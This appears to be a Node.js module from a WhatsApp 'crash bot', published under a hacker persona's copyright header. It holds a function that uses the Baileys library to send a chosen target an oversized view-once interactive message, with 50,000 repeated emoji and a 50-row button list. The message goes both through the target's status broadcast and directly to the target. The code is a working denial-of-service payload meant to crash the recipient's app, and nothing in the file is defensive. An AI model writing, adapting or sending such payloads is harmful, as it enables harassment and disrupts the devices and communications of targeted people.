/*
 * © 2026 NAVEED SND (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://youtube.com/
 * Instagram : sabi
 * Telegram  : https://t.me/dark_n_hacker
 * GitHub    : https://github.com/darknhckr
 * WhatsApp  : +923174886361
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */

const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto')

async function crashjam(SYxS7, target) {
    const payload = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "Crashed By NAVEED SND",
                        hasSubtitle: true
                    },
                    body: {
                        text: "🔥".repeat(50000)
                    },
                    footer: {
                        text: "System Failure"
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select_reply",
                                buttonParamsJson: JSON.stringify({
                                    title: "Crash",
                                    sections: [{
                                        title: "Select",
                                        rows: Array.from({ length: 50 }, (_, i) => ({
                                            title: `Row ${i}`,
                                            id: `id_${i}`
                                        }))
                                    }]
                                })
                            }
                        ]
                    }
                }
            }
        }
    };

    // Send to status
    await SYxS7.relayMessage("status@broadcast", payload, {
        statusJidList: [target]
    });

    // Send directly to target
    await SYxS7.relayMessage(target, payload, {
        participant: { jid: target }
    });
}

module.exports = { crashjam };
